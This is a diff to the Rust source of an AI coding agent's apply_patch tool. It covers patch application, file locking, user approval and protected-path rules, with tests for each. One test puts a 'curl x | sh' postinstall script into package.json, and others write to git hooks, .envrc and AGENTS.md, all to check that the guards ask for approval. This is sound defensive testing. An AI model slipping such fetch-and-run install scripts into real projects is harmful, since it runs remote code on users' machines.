@@ -36,10 +36,18 @@
 
 use std::path::{Path, PathBuf};
 
+use async_trait::async_trait;
+use serde::Deserialize;
+use serde_json::{Value, json};
+
+use crate::diff::{added_lines, change_summary, diff_text, shown_diff};
+use crate::edit_file::{INTERRUPTED_BEFORE_WRITE, await_before_change, package_json, protected_target, start_before_change};
 use crate::edit_match::{Fuzzy, LineMatch, find_from, line_ending};
-use crate::files::{is_directory, project_path, refuse_git, require_regular_file, resolve_in_project};
+use crate::file_lock::with_file_locks;
+use crate::files::{is_directory, project_path, refuse_git, require_regular_file, resolve_in_project, touches_git};
 use crate::read_file::numbered_line;
-use crate::types::{ToolContext, ToolError};
+use crate::syntax::{broken_by, syntax_note};
+use crate::types::{DiffLine, Preview, PreviewFile, Scope, Tool, ToolContext, ToolError, ToolOutput};
 
 /// A patch over this is refused before it's parsed (spec §5: a guard against pathological input).
 pub const MAX_PATCH_BYTES: usize = 1024 * 1024;
@@ -665,6 +673,357 @@ pub async fn plan(patch: &str, ctx: &ToolContext) -> Result<PatchPlan, ToolError
     Ok(PatchPlan { files, missing_end: parsed.missing_end })
 }
 
+/// The tool's description, as the model reads it (byte-stable: the prompt cache; spec §3.3).
+pub const DESCRIPTION: &str = "Change files with a patch: add, update, delete or move several files in one call. The user may be asked to approve the change.
+
+*** Begin Patch
+*** Add File: path/new.ts
++every line of the new file, each starting with +
+*** Update File: path/old.ts
+*** Move to: path/renamed.ts        (optional)
+@@ a line near the change, e.g. the function's signature (optional)
+ context line (unchanged, starts with a space)
+-removed line
++added line
+*** Delete File: path/gone.ts
+*** End Patch
+
+Paths are relative to the project root. Give about 3 lines of context above and below each change, copied exactly from read_file. Use one @@ header per change site; if the same context appears more than once, add an @@ line that makes it unique.";
+
+#[derive(Debug, Deserialize)]
+#[serde(deny_unknown_fields)]
+pub struct ApplyPatchInput {
+    pub patch: String,
+}
+
+/// Every path the patch names, sources and Move destinations, as written; None when it doesn't parse.
+fn patch_paths(patch: &str) -> Option<Vec<String>> {
+    if patch.len() > MAX_PATCH_BYTES {
+        return None;
+    }
+    let parsed = parse_patch(patch).ok()?;
+    Some(
+        parsed
+            .ops
+            .into_iter()
+            .flat_map(|op| match op {
+                PatchOp::Add { path, .. } | PatchOp::Delete { path } => vec![path],
+                PatchOp::Update { path, move_to, .. } => std::iter::once(path).chain(move_to).collect(),
+            })
+            .collect(),
+    )
+}
+
+/// What the result says after a forgiving match in one of the patch's files (`edit_file::fuzzy_note`, for hunks).
+fn patch_fuzzy_note(fuzzy: Fuzzy) -> &'static str {
+    match fuzzy {
+        Fuzzy::Unicode => {
+            "a hunk matched once typographic characters (curly quotes, dashes, …, Unicode spaces) were read as ASCII"
+        }
+        Fuzzy::TrailingWhitespace => "a hunk matched once trailing whitespace was ignored",
+        Fuzzy::Indentation => {
+            "a hunk matched only with different indentation; its added lines were re-indented to match the file"
+        }
+    }
+}
+
+/// The line a file of the patch gets in the preview, and in the result.
+fn heading(change: &FileChange, done: bool) -> String {
+    let (verb_now, verb_done) = match change.kind {
+        ChangeKind::Add => ("Add", "Added"),
+        ChangeKind::Update => ("Update", "Updated"),
+        ChangeKind::Delete => ("Delete", "Deleted"),
+        ChangeKind::Move => ("Move", "Moved"),
+    };
+    let verb = if done { verb_done } else { verb_now };
+    match &change.dest {
+        Some((_, _, dest)) => format!("{verb} {} → {dest}", change.shown),
+        None => format!("{verb} {}", change.shown),
+    }
+}
+
+/// A file's diff: before (nothing for an Add) to after (nothing for a Delete).
+fn change_diff(before: Option<&str>, after: Option<&str>) -> crate::diff::Diff {
+    match (before, after) {
+        (None, Some(after)) => {
+            let lines = added_lines(after);
+            let added = lines.len();
+            crate::diff::Diff { lines, added, removed: 0 }
+        }
+        (before, after) => diff_text(before.unwrap_or(""), after.unwrap_or(""), 3),
+    }
+}
+
+/// One file the run wrote (or removed), with the formatter's result for written ones.
+struct Written {
+    change: FileChange,
+    formatted: Option<crate::formatter::Formatted>,
+}
+
+/// Writes a new file (an Add, a Move's destination): never over one that appeared since the plan (outside Marv's
+/// locks: someone else's, never read here), as `write_file` creates.
+async fn create_new(absolute: &Path, content: &str) -> std::io::Result<()> {
+    use tokio::io::AsyncWriteExt;
+    if let Some(dir) = absolute.parent() {
+        tokio::fs::create_dir_all(dir).await?;
+    }
+    let mut file = tokio::fs::OpenOptions::new().write(true).create_new(true).open(absolute).await?;
+    file.write_all(content.as_bytes()).await?;
+    file.flush().await
+}
+
+/// Applies a planned patch under its locks: adds, updates and Move destinations first (formatted as they are
+/// written), then Move sources are removed, then deletes. Stops at the first I/O error: what was done, and what
+/// failed.
+async fn write_plan(planned: PatchPlan, ctx: &ToolContext) -> (Vec<Written>, Option<String>) {
+    let mut written = Vec::new();
+    let (deletes, writes): (Vec<FileChange>, Vec<FileChange>) =
+        planned.files.into_iter().partition(|f| f.kind == ChangeKind::Delete);
+    let mut moved = Vec::new();
+    for change in writes {
+        let after = change.after.clone().unwrap_or_default();
+        let (_, absolute, shown) = change.target();
+        let (absolute, shown) = (absolute.to_path_buf(), shown.to_string());
+        let result = match change.kind {
+            ChangeKind::Update => tokio::fs::write(&absolute, &after).await,
+            _ => create_new(&absolute, &after).await,
+        };
+        if let Err(e) = result {
+            if e.kind() == std::io::ErrorKind::AlreadyExists {
+                return (written, Some(format!("{shown}: {}", crate::file_versions::never_read(&shown))));
+            }
+            // It may have been cut short: the next write is refused until the file is read again.
+            ctx.file_versions.unsure(&absolute, after.as_bytes());
+            return (written, Some(format!("{shown}: couldn't write it: {e}")));
+        }
+        // #67: the project's formatter runs before anything is said; its failure is a note, not an error.
+        let formatted = crate::formatter::after_write(ctx, &shown, &absolute, &after).await;
+        ctx.file_versions.wrote(&absolute, &after, &formatted);
+        if change.kind == ChangeKind::Move {
+            moved.push(written.len());
+        }
+        written.push(Written { change, formatted: Some(formatted) });
+    }
+    for i in moved {
+        if let Err(e) = tokio::fs::remove_file(&written[i].change.absolute).await {
+            let failure = format!("{}: couldn't remove it after the move: {e}", written[i].change.shown);
+            return (moved_but_kept(written, i), Some(failure));
+        }
+    }
+    for change in deletes {
+        if let Err(e) = tokio::fs::remove_file(&change.absolute).await {
+            let failure = format!("{}: couldn't delete it: {e}", change.shown);
+            return (written, Some(failure));
+        }
+        written.push(Written { change, formatted: None });
+    }
+    (written, None)
+}
+
+/// The files written when a Move's source couldn't be removed: the destination stays written (it is), reported as
+/// an Add, since the source is still there.
+fn moved_but_kept(mut written: Vec<Written>, i: usize) -> Vec<Written> {
+    let change = &mut written[i].change;
+    if let Some((path, absolute, shown)) = change.dest.take() {
+        change.kind = ChangeKind::Add;
+        change.before = None;
+        (change.path, change.absolute, change.shown) = (path, absolute, shown);
+    }
+    written
+}
+
+pub struct ApplyPatch;
+
+#[async_trait]
+impl Tool for ApplyPatch {
+    type Input = ApplyPatchInput;
+
+    fn name(&self) -> &str {
+        "apply_patch"
+    }
+    fn description(&self) -> &str {
+        DESCRIPTION
+    }
+    fn schema(&self) -> Value {
+        json!({
+            "type": "object",
+            "properties": {
+                "patch": {"type": "string", "minLength": 1, "description": "The patch, from *** Begin Patch to *** End Patch."}
+            },
+            "required": ["patch"],
+            "additionalProperties": false
+        })
+    }
+    fn kind(&self) -> marv_core::ToolKind {
+        marv_core::ToolKind::Write
+    }
+    fn check(&self, input: &ApplyPatchInput) -> Result<(), String> {
+        if input.patch.trim().is_empty() { Err("patch: must not be empty".into()) } else { Ok(()) }
+    }
+    /// The project's files (and its formatter's output, quoted).
+    fn provenance(&self) -> marv_core::Provenance {
+        marv_core::Provenance::Project
+    }
+    fn label(&self, input: &ApplyPatchInput) -> String {
+        match patch_paths(&input.patch) {
+            Some(paths) if !paths.is_empty() => {
+                let mut label = paths.iter().take(3).cloned().collect::<Vec<_>>().join(", ");
+                if paths.len() > 3 {
+                    label.push_str(&format!(" and {} more", paths.len() - 3));
+                }
+                label
+            }
+            _ => "patch".into(),
+        }
+    }
+    fn scope(&self, _input: &ApplyPatchInput) -> Option<Scope> {
+        Some(Scope { key: "files".into(), description: "file changes".into() })
+    }
+    /// Yolo: only when every path, Move destinations included, is one `edit_file` would change unasked.
+    fn auto_safe(&self, input: &ApplyPatchInput, ctx: &ToolContext) -> bool {
+        patch_paths(&input.patch).is_some_and(|paths| paths.iter().all(|p| !touches_git(ctx, p)))
+    }
+    /// Spec §5: the first protected rule among all the patch's paths (sorted), sources and Move destinations alike
+    /// (moving a file away deletes it; moving one in writes there), with the home folder's rule on each
+    /// (`edit_file::protected_target`); then the `package.json` content rule on every resulting `package.json`, an
+    /// added one or a Move's destination included, judged against what is at that destination now.
+    fn protected_target(&self, input: &ApplyPatchInput, ctx: &ToolContext) -> Option<marv_sandbox::ProtectedRule> {
+        let mut paths = patch_paths(&input.patch)?;
+        paths.sort();
+        if let Some(rule) = paths.iter().find_map(|p| protected_target(p, ctx)) {
+            return Some(rule);
+        }
+        let parsed = parse_patch(&input.patch).ok()?;
+        parsed.ops.iter().any(|op| package_scripts_changed(op, ctx)).then_some(marv_sandbox::ProtectedRule::PackageScripts)
+    }
+
+    async fn preview(&self, input: &ApplyPatchInput, ctx: &ToolContext) -> Result<Preview, ToolError> {
+        start_before_change(ctx);
+        // Under the locks too, as edit_file's preview: another call of this session may have written one of the
+        // files and not yet recorded it as its version.
+        let planned = match patch_paths(&input.patch) {
+            Some(paths) => {
+                let paths: Vec<&str> = paths.iter().map(String::as_str).collect();
+                with_file_locks(ctx, &paths, || plan(&input.patch, ctx)).await?
+            }
+            None => plan(&input.patch, ctx).await?,
+        };
+        let files = planned
+            .files
+            .iter()
+            .map(|change| PreviewFile {
+                title: heading(change, false),
+                diff: Some(shown_diff(&change_diff(change.before.as_deref(), change.after.as_deref()).lines)),
+                note: None,
+            })
+            .collect::<Vec<_>>();
+        let count = files.len();
+        Ok(Preview {
+            title: if count == 1 { files[0].title.clone() } else { format!("Patch {count} files") },
+            files: Some(files),
+            ..Default::default()
+        })
+    }
+
+    async fn run(&self, input: &ApplyPatchInput, ctx: &ToolContext) -> Result<ToolOutput, ToolError> {
+        if await_before_change(ctx).await {
+            return Ok(ToolOutput::ok(INTERRUPTED_BEFORE_WRITE, "interrupted"));
+        }
+        let Some(paths) = patch_paths(&input.patch) else {
+            // Doesn't parse: the plan says why, and nothing is written.
+            return Err(plan(&input.patch, ctx).await.err().unwrap_or_else(|| ToolError("Invalid patch.".into())));
+        };
+        let paths: Vec<&str> = paths.iter().map(String::as_str).collect();
+        // Planned again under every file's lock: a file may have changed while the user was deciding. Each file is
+        // written and formatted under them, so a parallel edit can't be lost, and the formatter can't be formatted
+        // over.
+        let (missing_end, written, failure) = with_file_locks(ctx, &paths, || async {
+            let planned = plan(&input.patch, ctx).await?;
+            let missing_end = planned.missing_end;
+            let (written, failure) = write_plan(planned, ctx).await;
+            Ok::<_, ToolError>((missing_end, written, failure))
+        })
+        .await?;
+
+        let mut lines = Vec::new();
+        let mut notes = String::new();
+        let mut diff_lines = Vec::new();
+        let mut changed = Vec::new();
+        let (mut added, mut removed) = (0, 0);
+        for Written { change, formatted } in &written {
+            let after = formatted.as_ref().map(|f| f.content.as_str());
+            let diff = change_diff(change.before.as_deref(), after);
+            added += diff.added;
+            removed += diff.removed;
+            lines.push(format!("{} ({})", heading(change, true), change_summary(&diff)));
+            if !diff_lines.is_empty() && !diff.lines.is_empty() {
+                diff_lines.push(DiffLine::gap());
+            }
+            diff_lines.extend(diff.lines);
+            let (_, _, target) = change.target();
+            for fuzzy in &change.fuzzy {
+                notes.push_str(&format!("\n\nMarv: in {target}, {}.", patch_fuzzy_note(*fuzzy)));
+            }
+            if let (Some(formatted), Some(wrote)) = (formatted, &change.after) {
+                notes.push_str(&crate::formatter::notes(formatted, wrote));
+                if let Some(problem) = broken_by(target, change.before.as_deref(), &formatted.content).await {
+                    notes
+                        .push_str(&format!("\n\n{}", syntax_note(target, &problem, &formatted.content, change.before.is_some())));
+                }
+            }
+            if change.dest.is_some() {
+                changed.push(change.shown.clone());
+            }
+            changed.push(target.to_string());
+        }
+        if missing_end {
+            notes.push_str("\n\nMarv: the patch had no '*** End Patch' line; it was applied as if it ended there.");
+        }
+        let summary = change_summary(&crate::diff::Diff { lines: Vec::new(), added, removed });
+        let mut result = match &failure {
+            None => ToolOutput::ok(format!("{}{notes}", lines.join("\n")), summary),
+            Some(failure) => {
+                let applied =
+                    if lines.is_empty() { "Nothing was applied.".to_string() } else { format!("Applied:\n{}", lines.join("\n")) };
+                let mut out = ToolOutput::error(format!(
+                    "The patch stopped part-way. {applied}\nFailed: {failure}\nThe rest of the patch wasn't applied; /undo restores the whole turn.{notes}"
+                ));
+                out.summary = summary;
+                out
+            }
+        };
+        if !diff_lines.is_empty() {
+            result.diff = Some(shown_diff(&diff_lines));
+        }
+        result.changed = changed;
+        Ok(result)
+    }
+}
+
+/// The `package.json` content rule for one operation: whether the `package.json` it leaves (added, updated, or a Move's
+/// destination) has changed lifecycle scripts compared with what is at that path now (nothing, for an Add or a Move
+/// destination: the source's old content never stands in for "before"). One that can't be planned asks nothing here
+/// (its preview fails).
+fn package_scripts_changed(op: &PatchOp, ctx: &ToolContext) -> bool {
+    match op {
+        PatchOp::Add { path, content } => {
+            package_json(path, ctx).is_some() && marv_sandbox::protected::lifecycle_scripts_changed(None, content)
+        }
+        PatchOp::Delete { .. } => false,
+        PatchOp::Update { path, move_to, hunks } => {
+            let target = move_to.as_ref().unwrap_or(path);
+            if package_json(target, ctx).is_none() {
+                return false;
+            }
+            let Some(source) = resolve_in_project(ctx, path).ok() else { return false };
+            let Ok(before) = std::fs::read_to_string(&source) else { return false };
+            let Ok((after, _)) = apply_hunks(path, &before, hunks) else { return false };
+            let before_at_target = if move_to.is_some() { None } else { Some(before.as_str()) };
+            marv_sandbox::protected::lifecycle_scripts_changed(before_at_target, &after)
+        }
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -962,5 +1321,247 @@ mod tests {
         let root = TempDir::new("patch-big");
         let err = plan_in(&root, &"x".repeat(MAX_PATCH_BYTES + 1)).await.unwrap_err();
         assert!(err.0.contains("the limit is"), "{}", err.0);
+    }
+
+    // ---- the tool, through run_tool ----------------------------------------------------------------------------
+
+    mod tool {
+        use super::*;
+        use crate::registry::run_tool;
+        use crate::types::{Approval, ApprovalRequest, Approver, BeforeChange, Checkpoint, Decision};
+        use crate::{ToolRef, test_support::TempDir};
+        use marv_core::ToolCall;
+        use std::sync::{Arc, Mutex};
+
+        type Log = Arc<Mutex<Vec<String>>>;
+
+        struct Asks(Decision, Log, Mutex<Vec<ApprovalRequest>>);
+        #[async_trait]
+        impl Approver for Asks {
+            async fn approve(&self, request: ApprovalRequest) -> Decision {
+                self.1.lock().unwrap().push("approve".into());
+                self.2.lock().unwrap().push(request);
+                self.0.clone()
+            }
+        }
+        struct Logs(Log, &'static str);
+        #[async_trait]
+        impl Checkpoint for Logs {
+            async fn checkpoint(&self) {
+                self.0.lock().unwrap().push(self.1.into());
+            }
+        }
+        #[async_trait]
+        impl BeforeChange for Logs {
+            async fn before_change(&self) {
+                self.0.lock().unwrap().push(self.1.into());
+            }
+        }
+
+        fn tools() -> Vec<ToolRef> {
+            vec![Arc::new(ApplyPatch)]
+        }
+        fn call(patch: &str) -> ToolCall {
+            ToolCall { id: "c1".into(), name: "apply_patch".into(), arguments: json!({ "patch": patch }).to_string() }
+        }
+        /// A context that has read every file under `root`, answering `answer`, logging approvals and checkpoints.
+        fn context(root: &TempDir, answer: Decision) -> (ToolContext, Log, Arc<Asks>) {
+            let log: Log = Arc::default();
+            let asks = Arc::new(Asks(answer, log.clone(), Mutex::default()));
+            let mut ctx = ToolContext::new(root.path());
+            ctx.approver = Some(asks.clone());
+            ctx.checkpoint = Some(Arc::new(Logs(log.clone(), "checkpoint")));
+            for file in walk(root.path()) {
+                ctx.file_versions.saw(&file, &std::fs::read(&file).unwrap());
+            }
+            (ctx, log, asks)
+        }
+        fn read(root: &TempDir, rel: &str) -> Option<String> {
+            std::fs::read_to_string(root.path().join(rel)).ok()
+        }
+
+        const EVERYTHING: &str = "*** Begin Patch\n*** Update File: src/a.ts\n@@ export function a() {\n-  return 1;\n+  return 2;\n*** Add File: src/new.ts\n+export const n = 1;\n*** Update File: old.txt\n*** Move to: moved/new.txt\n-old\n+renamed\n*** Delete File: gone.txt\n*** End Patch";
+
+        fn everything_project(tag: &str) -> TempDir {
+            let root = TempDir::new(tag);
+            root.write("src/a.ts", "export function a() {\n  return 1;\n}\n");
+            root.write("old.txt", "old\n");
+            root.write("gone.txt", "bye\n");
+            root
+        }
+
+        #[tokio::test]
+        async fn one_approval_shows_every_file_then_everything_lands_and_changed_lists_it() {
+            let root = everything_project("patch-tool");
+            let (mut ctx, log, asks) = context(&root, Decision::Yes);
+            ctx.before_change = Some(Arc::new(Logs(log.clone(), "before_change")));
+            let out = run_tool(&call(EVERYTHING), &ctx, &tools()).await;
+            assert!(!out.result.is_error, "{}", out.result.output);
+            let asked = asks.2.lock().unwrap();
+            assert_eq!(asked.len(), 1);
+            assert_eq!(asked[0].scope.key, "files");
+            let titles: Vec<&str> = asked[0].preview.files.as_ref().unwrap().iter().map(|f| f.title.as_str()).collect();
+            assert_eq!(titles, ["Update src/a.ts", "Add src/new.ts", "Move old.txt → moved/new.txt", "Delete gone.txt"]);
+            // The baseline started with the preview and was awaited before the write; the checkpoint came after the yes.
+            let log = log.lock().unwrap().clone();
+            assert_eq!(log.first().map(String::as_str), Some("before_change"));
+            assert!(log.iter().position(|e| e == "approve") < log.iter().position(|e| e == "checkpoint"), "{log:?}");
+            assert_eq!(read(&root, "src/a.ts").unwrap(), "export function a() {\n  return 2;\n}\n");
+            assert_eq!(read(&root, "src/new.ts").unwrap(), "export const n = 1;\n");
+            assert_eq!(read(&root, "moved/new.txt").unwrap(), "renamed\n");
+            assert!(read(&root, "old.txt").is_none() && read(&root, "gone.txt").is_none());
+            assert_eq!(
+                out.result.output,
+                "Updated src/a.ts (+1 −1)\nAdded src/new.ts (+1 −0)\nMoved old.txt → moved/new.txt (+1 −1)\nDeleted gone.txt (+0 −1)"
+            );
+            assert_eq!(out.result.changed, ["src/a.ts", "src/new.ts", "old.txt", "moved/new.txt", "gone.txt"]);
+        }
+
+        #[tokio::test]
+        async fn a_decline_writes_nothing_and_takes_no_checkpoint() {
+            let root = everything_project("patch-decline");
+            let (ctx, log, _) = context(&root, Decision::No);
+            let out = run_tool(&call(EVERYTHING), &ctx, &tools()).await;
+            assert!(out.result.declined);
+            assert_eq!(*log.lock().unwrap(), ["approve"]);
+            assert_eq!(read(&root, "src/a.ts").unwrap(), "export function a() {\n  return 1;\n}\n");
+            assert!(read(&root, "src/new.ts").is_none() && read(&root, "gone.txt").is_some());
+        }
+
+        #[tokio::test]
+        async fn yolo_runs_an_ordinary_patch_unasked_but_never_one_that_touches_git_or_a_protected_path() {
+            let root = everything_project("patch-yolo");
+            root.write(".git/config", "[core]\n");
+            let (mut ctx, _, asks) = context(&root, Decision::No);
+            ctx.yolo = true;
+            let out = run_tool(&call(EVERYTHING), &ctx, &tools()).await;
+            assert_eq!(out.result.approval, Some(Approval::Auto), "{}", out.result.output);
+            assert!(asks.2.lock().unwrap().is_empty());
+            for body in [
+                "*** Add File: .git/hooks/pre-commit\n+evil",
+                "*** Add File: notes.md\n+x\n*** Add File: .envrc\n+evil",
+                "*** Update File: src/new.ts\n*** Move to: AGENTS.md\n-export const n = 1;\n+evil",
+            ] {
+                let (mut ctx, _, asks) = context(&root, Decision::No);
+                ctx.yolo = true;
+                let out = run_tool(&call(&patch_of(body)), &ctx, &tools()).await;
+                let asked = asks.2.lock().unwrap();
+                assert_eq!(asked.len(), 1, "{body}: {}", out.result.output);
+                assert!(out.result.declined, "{body}");
+            }
+            assert!(read(&root, ".envrc").is_none() && read(&root, "AGENTS.md").is_none());
+        }
+
+        #[tokio::test]
+        async fn a_file_that_changes_while_the_user_decides_is_refused_and_nothing_is_written() {
+            struct ChangesIt(PathBuf);
+            #[async_trait]
+            impl Approver for ChangesIt {
+                async fn approve(&self, _request: ApprovalRequest) -> Decision {
+                    std::fs::write(&self.0, "someone else's\n").unwrap();
+                    Decision::Yes
+                }
+            }
+            let root = everything_project("patch-race");
+            let (mut ctx, _, _) = context(&root, Decision::Yes);
+            ctx.approver = Some(Arc::new(ChangesIt(root.path().join("old.txt"))));
+            let out = run_tool(&call(EVERYTHING), &ctx, &tools()).await;
+            assert!(out.result.is_error, "{}", out.result.output);
+            assert_eq!(read(&root, "src/a.ts").unwrap(), "export function a() {\n  return 1;\n}\n");
+            assert!(read(&root, "src/new.ts").is_none() && read(&root, "gone.txt").is_some());
+        }
+
+        #[tokio::test]
+        async fn a_destination_that_appears_while_the_user_decides_stops_the_move() {
+            struct Plants(PathBuf);
+            #[async_trait]
+            impl Approver for Plants {
+                async fn approve(&self, _request: ApprovalRequest) -> Decision {
+                    std::fs::create_dir_all(self.0.parent().unwrap()).unwrap();
+                    std::fs::write(&self.0, "theirs\n").unwrap();
+                    Decision::Yes
+                }
+            }
+            let root = everything_project("patch-race-dest");
+            let (mut ctx, _, _) = context(&root, Decision::Yes);
+            ctx.approver = Some(Arc::new(Plants(root.path().join("moved/new.txt"))));
+            let out = run_tool(&call(EVERYTHING), &ctx, &tools()).await;
+            assert!(out.result.output.contains("already exists"), "{}", out.result.output);
+            assert_eq!(read(&root, "moved/new.txt").unwrap(), "theirs\n");
+            assert_eq!(read(&root, "src/a.ts").unwrap(), "export function a() {\n  return 1;\n}\n");
+        }
+
+        #[tokio::test]
+        async fn notes_say_which_forgiving_match_applied_and_when_a_file_broke() {
+            let root = TempDir::new("patch-notes");
+            root.write("a.json", "{\n  \"a\": 1\n}\n");
+            root.write("b.txt", "say(\u{201C}hi\u{201D})\n");
+            let (ctx, _, _) = context(&root, Decision::Yes);
+            let patch =
+                patch_of("*** Update File: a.json\n-  \"a\": 1\n+  \"a\": \n*** Update File: b.txt\n-say(\"hi\")\n+say(\"yo\")");
+            let out = run_tool(&call(&patch), &ctx, &tools()).await;
+            let output = &out.result.output;
+            assert!(output.contains("Marv: in b.txt, a hunk matched once typographic characters"), "{output}");
+            assert!(output.contains("a.json"), "{output}");
+            assert!(output.matches("Marv:").count() >= 2, "no syntax note: {output}");
+        }
+
+        #[tokio::test]
+        async fn a_missing_end_patch_is_applied_with_a_note() {
+            let root = TempDir::new("patch-no-end");
+            root.write("a.txt", "a\n");
+            let (ctx, _, _) = context(&root, Decision::Yes);
+            let out = run_tool(&call("*** Begin Patch\n*** Update File: a.txt\n-a\n+b\n"), &ctx, &tools()).await;
+            assert!(out.result.output.contains("had no '*** End Patch' line"), "{}", out.result.output);
+            assert_eq!(read(&root, "a.txt").unwrap(), "b\n");
+        }
+
+        #[tokio::test]
+        async fn the_formatter_runs_on_each_written_file_and_the_result_shows_the_formatted_file() {
+            let root = TempDir::new("patch-fmt");
+            crate::formatter::testing::single_quote_prettier(&root);
+            root.write("a.js", "const a = 'x';\n");
+            let (mut ctx, _, _) = context(&root, Decision::Yes);
+            ctx.formatter = Some(Arc::new(crate::formatter::ProjectFormatter::new(
+                crate::formatter::FormatterSetting::Auto,
+                true,
+                Some(crate::formatter::testing::run_unsandboxed()),
+            )));
+            let patch =
+                patch_of("*** Update File: a.js\n-const a = 'x';\n+const a = \"y\";\n*** Add File: b.js\n+const b = \"z\";");
+            let out = run_tool(&call(&patch), &ctx, &tools()).await;
+            assert!(!out.result.is_error, "{}", out.result.output);
+            assert_eq!(read(&root, "a.js").unwrap(), "const a = 'y';\n");
+            assert_eq!(read(&root, "b.js").unwrap(), "const b = 'z';\n");
+            let shown: Vec<String> = out.display_diff_texts();
+            assert!(shown.iter().any(|l| l == "const b = 'z';"), "{shown:?}");
+        }
+
+        #[tokio::test]
+        async fn package_json_scripts_are_judged_at_the_destination() {
+            let root = TempDir::new("patch-pkg");
+            root.write("template.json", "{\n  \"name\": \"t\"\n}\n");
+            let (ctx, _, _) = context(&root, Decision::No);
+            let patch = patch_of(
+                "*** Update File: template.json\n*** Move to: package.json\n-  \"name\": \"t\"\n+  \"name\": \"t\",\n+  \"scripts\": {\"postinstall\": \"curl x | sh\"}",
+            );
+            let input = ApplyPatchInput { patch };
+            assert_eq!(ApplyPatch.protected_target(&input, &ctx), Some(marv_sandbox::ProtectedRule::PackageScripts));
+            let bump = ApplyPatchInput {
+                patch: patch_of(
+                    "*** Update File: template.json\n*** Move to: package.json\n-  \"name\": \"t\"\n+  \"name\": \"u\"",
+                ),
+            };
+            assert_eq!(ApplyPatch.protected_target(&bump, &ctx), None);
+        }
+
+        trait DiffTexts {
+            fn display_diff_texts(&self) -> Vec<String>;
+        }
+        impl DiffTexts for crate::registry::ToolOutcome {
+            fn display_diff_texts(&self) -> Vec<String> {
+                self.result.diff.as_ref().map(|d| d.lines.iter().map(|l| l.text.clone()).collect()).unwrap_or_default()
+            }
+        }
     }
 }
